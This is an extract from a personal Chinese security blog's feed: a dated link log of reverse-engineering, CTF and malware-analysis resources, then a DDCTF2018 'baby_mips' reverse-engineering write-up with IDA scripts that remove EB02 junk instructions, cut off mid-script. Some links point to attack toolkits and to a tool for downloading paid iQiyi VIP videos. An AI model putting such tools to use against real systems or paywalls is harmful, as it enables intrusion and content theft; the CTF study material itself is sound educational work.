target="_blank" rel="noopener">https://github.com/tom0li/collection-document</a></p><p><strong>IDA Pro plugin to make functions tree view</strong><br><a href="https://github.com/ax330d/functions-plus" target="_blank" rel="noopener">https://github.com/ax330d/functions-plus</a></p><h3 id="2018-7-5"><a href="#2018-7-5" class="headerlink" title="2018.7.5"></a>2018.7.5</h3><p>今天参加了2018工业信息安全技能大赛，实际的分析了一次工业固件，感觉难度很大，之前也没有接触过工控安全，还是挺有趣的，参赛选手大多是掉光头发的中年man。。。</p><p><strong>The Return of Disassembly Desynchronization</strong><br><a href="https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md" target="_blank" rel="noopener">https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md</a></p><p><strong>Zeratool - 自动化生成漏洞利用并寻找 Flag 的 CTF 比赛工具</strong><br><a href="https://github.com/ChrisTheCoolHut/Zeratool" target="_blank" rel="noopener">https://github.com/ChrisTheCoolHut/Zeratool</a></p><p><strong>Detecting Reverse Engineering with Canaries</strong><br><a href="https://mulliner.org/collin/publications/Detecting_Reverse_Engineering_with_Canaries_CanSecWest2018.pdf" target="_blank" rel="noopener">https://mulliner.org/collin/publications/Detecting_Reverse_Engineering_with_Canaries_CanSecWest2018.pdf</a></p><p><strong>10 Cool Nmap Tricks and Techniques</strong><br><a href="https://blog.urfix.com/10-cool-nmap-tricks-techniques/" target="_blank" rel="noopener">https://blog.urfix.com/10-cool-nmap-tricks-techniques/</a></p><p><strong>基于 QEMU 的逆向分析沙箱 PyREBox</strong><br><a href="https://github.com/Cisco-Talos/pyrebox/tree/master/exploit_detect" target="_blank" rel="noopener">https://github.com/Cisco-Talos/pyrebox/tree/master/exploit_detect</a></p><p><strong>针对 ELF 文件格式的解析与利用</strong><br><a href="https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267" target="_blank" rel="noopener">https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267</a></p><p><strong>使用 IDA Python 进行相似漏洞搜索</strong><br><a href="https://www.zerodayinitiative.com/blog/2018/6/26/mindshare-variant-hunting-with-ida-python" target="_blank" rel="noopener">https://www.zerodayinitiative.com/blog/2018/6/26/mindshare-variant-hunting-with-ida-python</a></p><p><strong>The 101 of ELF files on Linux</strong><br><a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/" target="_blank" rel="noopener">https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/</a></p><p><strong>初学者的逆向工程学习网站</strong><br><a href="https://begin.re" target="_blank" rel="noopener">https://begin.re</a></p><p><strong>rogue - 无线网络攻击工具包</strong><br><a href="https://github.com/InfamousSYN/rogue" target="_blank" rel="noopener">https://github.com/InfamousSYN/rogue</a></p><p><strong>反调试及绕过</strong><br><a href="http://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%8F%8A%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">http://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%8F%8A%E7%BB%95%E8%BF%87/</a></p><p><strong>基于CTF挑战写就的二进制分析课程</strong>(很棒！)<br><a href="https://maxkersten.nl/binary-analysis-course/" target="_blank" rel="noopener">https://maxkersten.nl/binary-analysis-course/</a></p><p><strong>Intro to x86 Assembly Language</strong><br>视频:  <a href="https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe" target="_blank" rel="noopener">https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe</a><br>代码:  <a href="https://github.com/code-tutorials/assembly-intro" target="_blank" rel="noopener">https://github.com/code-tutorials/assembly-intro</a></p><p><strong>awesome-ninja-admins</strong><br><a href="https://github.com/trimstray/awesome-ninja-admins" target="_blank" rel="noopener">https://github.com/trimstray/awesome-ninja-admins</a></p><p><strong>信息安全知识库 2018全站离线打包</strong><br><a href="https://pan.baidu.com/s/1gf4Brb1#list/path=%2F" target="_blank" rel="noopener">https://pan.baidu.com/s/1gf4Brb1#list/path=%2F</a></p><p><strong>Docker概念详细的介绍</strong><br><a href="https://mp.weixin.qq.com/s?__biz=MzU4NDQ4MzU5OA==&amp;mid=2247484127&amp;idx=1&amp;sn=70ee95619ec761da884c4f9af3e83194&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU4NDQ4MzU5OA==&amp;mid=2247484127&amp;idx=1&amp;sn=70ee95619ec761da884c4f9af3e83194&amp;scene=21#wechat_redirect</a></p><p><strong>ip2region:ip地址定位库，0.0x毫秒级查询，数据库文件大小只有1.5M</strong><br><a href="http://t.cn/Rt9u3Ef" target="_blank" rel="noopener">http://t.cn/Rt9u3Ef</a></p><h3 id="2018-6-23"><a href="#2018-6-23" class="headerlink" title="2018.6.23"></a>2018.6.23</h3><p><strong>针对恶意软件逆向工程的新手引导大挑战</strong><br><a href="https://www.malwaretech.com/beginner-malware-reversing-challenges" target="_blank" rel="noopener">https://www.malwaretech.com/beginner-malware-reversing-challenges</a></p><p><strong>Hook原理</strong><br><a href="https://bbs.pediy.com/thread-228669.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228669.htm</a></p><p><strong>用Python任意下载爱奇艺VIP视频</strong><br><a href="https://www.77169.com/html/211389.html" target="_blank" rel="noopener">https://www.77169.com/html/211389.html</a></p><h3 id="2018-6-20"><a href="#2018-6-20" class="headerlink" title="2018.6.20"></a>2018.6.20</h3><p>放假快乐！</p><p><strong>使用Radare2和Cutter解密APT33的Dropshot恶意软件</strong><br><a href="https://www.megabeets.net/decrypting-dropshot-with-radare2-and-cutter-part-1/" target="_blank" rel="noopener">https://www.megabeets.net/decrypting-dropshot-with-radare2-and-cutter-part-1/</a></p><p><strong>A journey into Radare2</strong><br><a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/" target="_blank" rel="noopener">https://github.com/ITAYC0HEN/A-journey-into-Radare2/</a></p><p><strong>逆向工程的发展过程回顾与展望，来自 SSTIC 2018 Halvar Flake</strong><br><a href="https://docs.google.com/presentation/d/1ljVUiXVi2PfEdolGXr7Wpepj0x2RxaOo9rzMKWXebG4/mobilepresent?slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1ljVUiXVi2PfEdolGXr7Wpepj0x2RxaOo9rzMKWXebG4/mobilepresent?slide=id.p</a></p><p><strong>x86 assembly doesn’t have to be scary (interactive)</strong><br><a href="https://blog.benjojo.co.uk/post/interactive-x86-bootloader-tutorial" target="_blank" rel="noopener">https://blog.benjojo.co.uk/post/interactive-x86-bootloader-tutorial</a></p><p><strong>Penetration-Testing - 渗透测试方向优秀资源收集</strong><br><a href="https://github.com/Kinimiwar/Penetration-Testing" target="_blank" rel="noopener">https://github.com/Kinimiwar/Penetration-Testing</a></p><p><strong>Reverse-engineered Diablo source code </strong><br><a href="https://github.com/galaxyhaxz/devilution" target="_blank" rel="noopener">https://github.com/galaxyhaxz/devilution</a></p><h3 id="2018-6-15"><a href="#2018-6-15" class="headerlink" title="2018.6.15"></a>2018.6.15</h3><p><strong>使用 ptrace 进行反调试并实现对 ptrace 的隐藏调用</strong><br><a href="https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/hiding_call_to_ptrace/hiding_call_to_ptrace.md" target="_blank" rel="noopener">https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/hiding_call_to_ptrace/hiding_call_to_ptrace.md</a></p><p><strong>如何在网络安全领域获得职业的成功：信息安全入门，学习，练习和成长指南(Daniel Miessler)</strong><br><a href="https://danielmiessler.com/blog/build-successful-infosec-career/" target="_blank" rel="noopener">https://danielmiessler.com/blog/build-successful-infosec-career/</a></p><p><strong>手查PE导出表</strong><br><a href="https://bbs.pediy.com/thread-205989.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-205989.htm</a></p><p><strong>手查PE重定向</strong><br><a href="https://bbs.pediy.com/thread-206072.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-206072.htm</a></p><h3 id="2018-6-14"><a href="#2018-6-14" class="headerlink" title="2018.6.14"></a>2018.6.14</h3><p><strong>深入解析虚拟化</strong><br><a href="https://saferwall.com/blog" target="_blank" rel="noopener">https://saferwall.com/blog</a></p><h3 id="2018-6-13"><a href="#2018-6-13" class="headerlink" title="2018.6.13"></a>2018.6.13</h3><p><strong>栈溢出攻击原理实例详解</strong><br><a href="http://www.purpleroc.com/html/961247.html" target="_blank" rel="noopener">http://www.purpleroc.com/html/961247.html</a></p><h3 id="2018-6-12"><a href="#2018-6-12" class="headerlink" title="2018.6.12"></a>2018.6.12</h3><p><strong>逆向基于 Unity 引擎的 Android 游戏 Temple Run（神庙逃亡）</strong><br><a href="https://www.rotlogix.com/blog/2018/6/10/reverse-engineering-android-unity-games-part-one" target="_blank" rel="noopener">https://www.rotlogix.com/blog/2018/6/10/reverse-engineering-android-unity-games-part-one</a></p><h3 id="2018-6-11"><a href="#2018-6-11" class="headerlink" title="2018.6.11"></a>2018.6.11</h3><p><strong>C语言实现虚拟机</strong><br><a href="https://felixangell.com/blog/virtual-machine-in-c" target="_blank" rel="noopener">https://felixangell.com/blog/virtual-machine-in-c</a></p><p><strong>C语言实现哈希表</strong><br><a href="https://github.com/jamesroutley/write-a-hash-table" target="_blank" rel="noopener">https://github.com/jamesroutley/write-a-hash-table</a></p><h3 id="2018-6-10"><a href="#2018-6-10" class="headerlink" title="2018.6.10"></a>2018.6.10</h3><p><strong>FC机之超级玛丽简单逆向分析</strong><br><a href="https://bbs.pediy.com/thread-175564.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-175564.htm</a></p><h3 id="2018-6-9"><a href="#2018-6-9" class="headerlink" title="2018.6.9"></a>2018.6.9</h3><p><strong>全球气候可视化</strong><br><a href="https://earth.nullschool.net/" target="_blank" rel="noopener">https://earth.nullschool.net/</a></p><p><strong>图片文字清除插件</strong><br><a href="https://projectnaptha.com/" target="_blank" rel="noopener">https://projectnaptha.com/</a></p><p><strong>一个神奇的手绘公式网站</strong><br><a href="http://webdemo.myscript.com/" target="_blank" rel="noopener">http://webdemo.myscript.com/</a></p><p><strong>电影台词检索网站(英文)</strong><br><a href="http://www.subzin.com/" target="_blank" rel="noopener">http://www.subzin.com/</a></p><h3 id="2018-6-8"><a href="#2018-6-8" class="headerlink" title="2018.6.8"></a>2018.6.8</h3><p><strong>一本面向极客，致力于提高 Mac 工作效率的实用手册 </strong><br><a href="https://bestswifter.gitbook.io/effectivemac/" target="_blank" rel="noopener">https://bestswifter.gitbook.io/effectivemac/</a></p><p><strong>raspberry-pi-os - 使用 Linux 内核和 Raspberry Pi 进行操作系统开发的学习指南</strong><br><a href="https://github.com/s-matyukevich/raspberry-pi-os" target="_blank" rel="noopener">https://github.com/s-matyukevich/raspberry-pi-os</a></p><p><strong>虚拟机保护逆向入门</strong><br><a href="http://t.cn/RB7VCDU" target="_blank" rel="noopener">http://t.cn/RB7VCDU</a></p><h3 id="2018-6-6"><a href="#2018-6-6" class="headerlink" title="2018.6.6"></a>2018.6.6</h3><p>最近忙于复习</p><p><strong>符号执行引擎KLEE</strong><br><a href="http://klee.github.io/" target="_blank" rel="noopener">http://klee.github.io/</a></p><p><a href="https://srg.doc.ic.ac.uk/klee18/schedule.html" target="_blank" rel="noopener">https://srg.doc.ic.ac.uk/klee18/schedule.html</a></p><h3 id="2018-6-2"><a href="#2018-6-2" class="headerlink" title="2018.6.2"></a>2018.6.2</h3><p>复习了几天，今天考完几门，下下星期还得考高数，惆怅</p><p><strong>漫画风讲解DNS over HTTPS</strong><br><a href="https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/" target="_blank" rel="noopener">https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/</a></p><hr><h3 id="2018-5-25-27"><a href="#2018-5-25-27" class="headerlink" title="2018.5.25-27"></a>2018.5.25-27</h3><p>这两天在大佬的带领下参加了川渝赛区的西普杯信息安全铁人三项赛<br>赛题分为数据赛，个人赛和企业赛<br>数据赛为数据流量分析，企业赛为渗透真实企业环境都算是web吧应该<br>个人赛是pwn！pwn！pwn！<br>于是盯了一天的pwn1，是道rop的题，pwn师傅肯定两分钟就做出来了。。作为re菜鸡只能现学现卖，先逆了遍流程(反正也不会pwn)，然后照着网上的资料，用ROPgadget( <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a> )生成了rop利用链，然后copy一个exp，改一改，运行。最后因为经验不足，没有找到真正的溢出长度，于是就很遗憾了(还是因为太菜</p><p>这次比赛给我感触很大，在实际的环境当中要懂的不仅仅是软件自身的保护，还应该了解网络以及软件对用户的保障。在信息安全竞赛中，也应该拓宽自己的知识面，才能灵活应对。</p><p>就写这么多吧，还是挺开心的</p><hr><h3 id="2018-5-24"><a href="#2018-5-24" class="headerlink" title="2018.5.24"></a>2018.5.24</h3><p>Miasm的博客，研究<strong>动态符号执行</strong><br><a href="http://www.miasm.re/blog/index.html" target="_blank" rel="noopener">http://www.miasm.re/blog/index.html</a></p><p><strong>The Legend of Random的系列教程</strong><br><a href="https://legend.octopuslabs.io/index.html" target="_blank" rel="noopener">https://legend.octopuslabs.io/index.html</a></p><hr><h3 id="2018-5-23"><a href="#2018-5-23" class="headerlink" title="2018.5.23"></a>2018.5.23</h3><p>今天做完了那天的题，写了wp</p><p>Dwarf Fortress真的很有意思，找到一个很易懂的教程 <a href="https://df-walkthrough.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://df-walkthrough.readthedocs.io/en/latest/</a></p><p><strong>理解与分析 ELF 二进制文件格式</strong><br> <a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/" target="_blank" rel="noopener">https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/</a></p><p><strong>使用 IDA Pro 和 x64dbg 逆向分析 Gootkit 恶意软件</strong><br><a href="https://www.youtube.com/watch?v=242Tn0IL2jE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=242Tn0IL2jE</a></p><hr><h3 id="2018-5-22"><a href="#2018-5-22" class="headerlink" title="2018.5.22"></a>2018.5.22</h3><p>看到一个<strong>IDA快捷键的总结</strong> <a href="https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/IDA/IDA_Pro_Shortcuts.pdf" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/IDA/IDA_Pro_Shortcuts.pdf</a></p><p><strong>GDB基本命令</strong><br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/gdb/GDB%20Cheat%20Sheet.pdf" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/gdb/GDB%20Cheat%20Sheet.pdf</a></p><p><strong>CTF知识合集</strong><br><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>一个著名的游戏<strong>Dwarf Fortress</strong><br><a href="http://www.bay12games.com/dwarves/index.html" target="_blank" rel="noopener">http://www.bay12games.com/dwarves/index.html</a></p><hr><h3 id="2018-5-21"><a href="#2018-5-21" class="headerlink" title="2018.5.21"></a>2018.5.21</h3><p>早上五点被热醒。。。学校半夜断电，开不了空调，差评<br>开电脑继续看昨天的题，进展很大，在让栈指针平衡后，IDA可以F5了，瞬间很好理解，但是算法太复杂了，学习了gdb动态调试，的确是非常强大的工具。</p><p>还是没做出来，很难受<br>晚上看了一个很棒的CTF总结 <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/</a></p><hr><h3 id="2018-5-20"><a href="#2018-5-20" class="headerlink" title="2018.5.20"></a>2018.5.20</h3><p>本来准备“好好学英语”，结果实验室来了场练习赛<br>逆向是一道Linux的，压缩包里给了一个二进制文件和一个名为“out”的文件，里面是几行十六进制之类的，总感觉这个题给的形式在哪儿见过，但是想不起来了。F5不能分析，看看图形化分析，算法很复杂，想用angr，但存在alarm函数，angr脚本运行不了，毫无思路，感觉最近很浮躁</p><p>晚上边看英语边看RNG。。。</p><hr><h3 id="2018-5-19"><a href="#2018-5-19" class="headerlink" title="2018.5.19"></a>2018.5.19</h3><p>一整天又是实验课又是ACM比赛，晚上九点多才好好吃了顿饭。<br>打ACM太菜了，没算法没数据没脑洞，有几道题好不容易输出符合，还不给AC。。。还是滚回来看逆向好了(虽说也很菜)</p><hr><h3 id="2018-5-18"><a href="#2018-5-18" class="headerlink" title="2018.5.18"></a>2018.5.18</h3><p>今天就把前几天的也记上吧</p><h4 id="1-打造个性超赞博客Hexo-NexT-GithubPages的超深度优化"><a href="#1-打造个性超赞博客Hexo-NexT-GithubPages的超深度优化" class="headerlink" title="1.打造个性超赞博客Hexo+NexT+GithubPages的超深度优化"></a>1.打造个性超赞博客Hexo+NexT+GithubPages的超深度优化</h4><p>这篇文章加里面的链接可以说是优化博客非常全的一篇文章了</p><blockquote><p><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" target="_blank" rel="noopener">https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html</a></p></blockquote><h4 id="2-一个假装是死循环的有限循环"><a href="#2-一个假装是死循环的有限循环" class="headerlink" title="2.一个假装是死循环的有限循环"></a>2.一个假装是死循环的有限循环</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(int i=1; i&lt;0; i++)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; &quot;我不是死循环&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理: 明天写。。。</p><h4 id="3-IDA-技巧-处理动态导入"><a href="#3-IDA-技巧-处理动态导入" class="headerlink" title="3.IDA 技巧-处理动态导入"></a>3.IDA 技巧-处理动态导入</h4><blockquote><p><a href="https://www.usualsuspect.re/article/ida-tricks-handling-dynamic-imports" target="_blank" rel="noopener">https://www.usualsuspect.re/article/ida-tricks-handling-dynamic-imports</a></p></blockquote><h4 id="4-逆向-Path-of-Exile-游戏系列"><a href="#4-逆向-Path-of-Exile-游戏系列" class="headerlink" title="4.逆向 Path of Exile 游戏系列"></a>4.逆向 Path of Exile 游戏系列</h4><blockquote><p>Part 1： <a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile.html</a><br>Part 2： <a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile_0.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile_0.html</a><br>Part 3：<a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile-game.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile-game.html</a></p></blockquote><h4 id="5-Adobe-Acrobat-Reader-DC-远程代码执行漏洞详情披露-CVE-2018-4996、CVE-2018-4947"><a href="#5-Adobe-Acrobat-Reader-DC-远程代码执行漏洞详情披露-CVE-2018-4996、CVE-2018-4947" class="headerlink" title="5.Adobe Acrobat Reader DC 远程代码执行漏洞详情披露(CVE-2018-4996、CVE-2018-4947)"></a>5.Adobe Acrobat Reader DC 远程代码执行漏洞详情披露(CVE-2018-4996、CVE-2018-4947)</h4><blockquote><p><a href="https://blog.talosintelligence.com/2018/05/multiple-acrobat-reader-vulns.html" target="_blank" rel="noopener">https://blog.talosintelligence.com/2018/05/multiple-acrobat-reader-vulns.html</a></p></blockquote><p>From <a href="https://kabeor.github.io/Top/">https://kabeor.github.io/Top/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h1&gt;&lt;p&gt;一直想要写这个了，每天记录，每周上传吧，把每天有意思的事物写下来&lt;/p&gt;
&lt;h2 id=&quot;Issue&quot;&gt;&lt;a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DDCTF2018 Reverse writeup(1) baby_mips</title>
    <link href="https://kabeor.github.io/DDCTF2018%20Reverse%20writeup(1)%20baby_mips/"/>
    <id>https://kabeor.github.io/DDCTF2018 Reverse writeup(1) baby_mips/</id>
    <published>2018-05-15T04:07:53.287Z</published>
    <updated>2018-07-16T09:23:21.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2018-Reverse-writeup"><a href="#DDCTF2018-Reverse-writeup" class="headerlink" title="DDCTF2018 Reverse writeup"></a>DDCTF2018 Reverse writeup</h1><h2 id="baby-mips"><a href="#baby-mips" class="headerlink" title="baby_mips"></a>baby_mips</h2><p>花了一天，终于写完了</p><p>这是一道mips指令集的逆向题。<br>关于mips架构  <a href="https://zh.wikipedia.org/wiki/MIPS%E6%9E%B6%E6%A7%8B" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/MIPS%E6%9E%B6%E6%A7%8B</a></p><h3 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h3><p>在ubuntu运行<br><code>./baby_mips</code></p><p>会让输入16个值,然后提示非法指令<br><img src="https://i.loli.net/2018/07/16/5b4c615ee4801.jpg" alt="mark"></p><p>在IDA中分析一下</p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>进入IDA首先就是搜索字符串<br>显而易见<br><img src="https://i.loli.net/2018/07/16/5b4c615f0bf91.jpg" alt="mark"><br>图形化分析这里<br><img src="https://i.loli.net/2018/07/16/5b4c615f2d212.jpg" alt="mark"><br>可以看出是一个简单的条件判断</p><p>如果你以为F5看算法写脚本就结束，那就too native了</p><h3 id="使用qemu模拟器动态调试"><a href="#使用qemu模拟器动态调试" class="headerlink" title="使用qemu模拟器动态调试"></a>使用qemu模拟器动态调试</h3><p>baby_mips是MIPS指令集上的程序，IDA只能静态分析，不能debug。采取的方法是在linux机上安装qemu模拟器，利用qemu来运行MIPS指令程序。</p><p>因此，首先当然是在ubuntu上安装qemu模拟器了<br><code>sudo apt-get install qemu</code><br>就可以了</p><p>qemu可以模拟很多指令集<br><img src="https://i.loli.net/2018/07/16/5b4c615f4e755.jpg" alt="mark"></p><p><strong>关于用法，最简单的</strong><br><code>qemu-你需要的指令集 文件名</code></p><p><strong>如果要利用IDA调试(IDA远程调试)</strong><br><code>qemu-你需要的指令集 -g 端口 文件名</code><br>原理：qemu -g port指令开启一个gdbserver。port另一端可以由IDA或gdb连接调试。</p><p>运行以后在IDA<br><img src="https://i.loli.net/2018/07/16/5b4c615f7382c.jpg" alt="mark"><br>选GDB调试，点左边绿色的RUN<br><img src="https://i.loli.net/2018/07/16/5b4c615f96143.jpg" alt="mark"><br>确定<br><img src="https://i.loli.net/2018/07/16/5b4c615fa8f78.jpg" alt="mark"><br>确定<br><img src="https://i.loli.net/2018/07/16/5b4c615fbcf6a.jpg" alt="mark"></p><p>下面我们需要输入的是Hostname和Port，如果你是在运行qemu的系统里运行IDA，Hostname就填127.0.0.1，要是别的系统，比如你用的是虚拟机，就填运行qume的系统的IP,Port就填刚刚qemu里设置好的就行。(这些是常识了)</p><p>然后确认IDA就可以动态调试了</p><p>经过尝试，这里的baby_mips是mips小字端程序，所以我们运行指令<br><code>qemu-mipsel -g 6666 baby_mips</code><br>然后IDA点确定<br><img src="https://i.loli.net/2018/07/16/5b4c615fd14a2.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c617b00159.jpg" alt="mark"><br>成功了</p><p>我们运行程序，输入16个数，弹出一个错<br><img src="https://i.loli.net/2018/07/16/5b4c617b26015.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c617b4755e.jpg" alt="mark"></p><p>程序停在了00400430，并且这里的指令是以EB02开头的</p><p>往下翻翻，发现非常多的EB02，然后下面的指令就不被识别了</p><p><img src="https://i.loli.net/2018/07/16/5b4c617b69646.jpg" alt="mark"></p><p>IDA有一个强大的插件</p><blockquote><p>keypatch —–<a href="http://www.keystone-engine.org/keypatch/" target="_blank" rel="noopener">http://www.keystone-engine.org/keypatch/</a></p></blockquote><p>可以用这个插件把第一个EB02 NOP ，然后运行的话会发现又在下一个EB02报错，所以应该就是EB02的问题了</p><p>至于原理，参阅了很多篇wp，大概就是</p><blockquote><p>查找lwc1指令的含义，发现是与协处理器相关的指令。通过对后面的代码块进行分析发现，后面并没有用到$f29和$t1寄存器的内容</p><p>指令的头两个字节为 \xEB\x02 ，且在x86指令集中 \xEB 为跳转指令。</p><p>把操作码反汇编成汇编代码后发现第一条指令是 jmp 0x4 ，刚好MIPS指令集每条指令大小为4字节。</p><p>猜测程序让我们遇到这个指令就跳转四字节</p></blockquote><p>于是现在的思路就是将所有EB02开头的指令nop</p><p>由于MIPS指令是定长的，均为4个字节。因此，可以在选定的代码块中，将所有以EB 02开始的4字节数据全部替换成00 00 00 00，在MIPS指令中，nop对应的机器码为00 00 00 00</p><p>需要固定监测指令的头部，是因为可能会误清除掉正常指令</p><h3 id="使用脚本去除EB02指令"><a href="#使用脚本去除EB02指令" class="headerlink" title="使用脚本去除EB02指令"></a>使用脚本去除EB02指令</h3><p>下面是各位大佬写的IDC或IDPython脚本，功能都是去除EB02指令</p><hr><p>来自‘奈沙夜影’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line"></span><br><span class="line">static matchBytes(StartAddr, Match) </span><br><span class="line">&#123; </span><br><span class="line">    auto Len, i, PatSub, SrcSub; </span><br><span class="line">    Len = strlen(Match);</span><br><span class="line"></span><br><span class="line">    while (i &lt; Len) </span><br><span class="line">    &#123; </span><br><span class="line">       PatSub = substr(Match, i, i+1); </span><br><span class="line">       SrcSub = form(&quot;%02X&quot;, Byte(StartAddr)); </span><br><span class="line">       SrcSub = substr(SrcSub, i % 2, (i % 2) + 1); </span><br><span class="line"></span><br><span class="line">       if (PatSub != &quot;?&quot; &amp;&amp; PatSub != SrcSub) </span><br><span class="line">       &#123; </span><br><span class="line">        return 0; </span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line">       if (i % 2 == 1) </span><br><span class="line">       &#123; </span><br><span class="line">        StartAddr++; </span><br><span class="line">       &#125; </span><br><span class="line">       i++; </span><br><span class="line">    &#125;</span><br><span class="line">    return 1; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static main() </span><br><span class="line">&#123; </span><br><span class="line">   auto StartVa, SavedStartVa, StopVa, Size, i, j;</span><br><span class="line"></span><br><span class="line">    StartVa = 0x400420; </span><br><span class="line">    StopVa = 0x403233;</span><br><span class="line"></span><br><span class="line">    Size = StopVa - StartVa; </span><br><span class="line">    SavedStartVa = StartVa;</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; Size/4; i++) </span><br><span class="line">    &#123; </span><br><span class="line">       if (matchBytes(StartVa, &quot;EB02????&quot;)) </span><br><span class="line">       &#123; </span><br><span class="line">            Message(&quot;Find%x:%02x%02x%02x%02x\n&quot;, StartVa,Byte(StartVa),Byte(StartVa+1),Byte(StartVa+2),Byte(StartVa+3));</span><br><span class="line">            for (j = 0; j &lt; 4; j++) </span><br><span class="line">            &#123; </span><br><span class="line"></span><br><span class="line">                 PatchByte(StartVa, 0x00); </span><br><span class="line">                 MakeCode(StartVa); </span><br><span class="line">                 StartVa++; </span><br><span class="line">            &#125; </span><br><span class="line">       &#125; </span><br><span class="line">        else</span><br><span class="line">            StartVa=StartVa+4; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnalyzeArea(SavedStartVa, StopVa); </span><br><span class="line">    Message(&quot;Clear eb02 Opcode Ok &quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>来自‘逢魔安全实验室’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">f = open(&quot;baby_mips&quot;, &quot;rb&quot;)</span><br><span class="line">content = f.read()</span><br><span class="line">content = list(content)</span><br><span class="line">for x in range(0, len(content)):</span><br><span class="line">    if content[x] == &quot;\xeb&quot; and content[x+1] == &quot;\x02&quot; and (x%4==0):</span><br><span class="line">        content[x] = &quot;\x00&quot;</span><br><span class="line">        content[x+1] = &quot;\x00&quot;</span><br><span class="line">        content[x+2] = &quot;\x00&quot;</span><br><span class="line">        content[x+3] = &quot;\x00&quot;</span><br><span class="line">content = &quot;&quot;.join(content)</span><br><span class="line">p = open(&quot;patch&quot;, &quot;wb&quot;)</span><br><span class="line">p.write(content)</span><br></pre></td></tr></table></figure><hr><p>来自‘cq674350529’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import idautils</span><br><span class="line">import idc</span><br><span class="line">import idaapi</span><br><span class="line"></span><br><span class="line">start_addr = 0x400420</span><br><span class="line">end_addr = 0x403234</span><br><span class="line">while start_addr &lt;= end_addr:</span><br><span class="line">    if Byte(start_addr) == 0xeb and Byte(start_addr +1) == 0x2:</span><br><span class="line">        PatchByte(start_addr,0x00)</span><br><span class="line">        PatchByte(start_addr+1,0x00)</span><br><span class="line">        PatchByte(start_addr+2,0x00)</span><br><span class="line">        PatchByte(start_addr+3,0x00)</span><br><span class="line">    start_addr += 